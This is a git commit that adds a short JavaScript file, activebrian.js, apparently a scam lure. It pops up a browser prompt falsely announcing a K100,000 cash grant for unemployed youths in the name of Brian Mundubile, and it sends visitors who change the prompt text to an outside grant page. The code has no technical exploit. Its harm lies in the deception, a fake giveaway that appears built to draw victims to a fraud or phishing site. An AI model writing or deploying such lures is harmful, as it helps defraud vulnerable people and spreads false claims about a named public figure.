3470939897eccac464d9670e904dec6c3745fd04
The-On-going <sirpeelawson@gmail.com>
2026-08-11 23:53:10 +0100

    Create activebrian.js

---
+++ activebrian.js
@@ -0,0 +1,10 @@
+var password = 'WITHDRAW K100,000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive BRIAN MUNDUBILE K100,000 Cash Grant for Unemployed Youths. Click OK to receive Instantly.',
+  'WITHDRAW K100,000'
+);
+
+if (password !== 'WITHDRAW K100,000') {
+    location.href = 'https://ongoing-grant.info/K100000-Mundubile.html';
+}
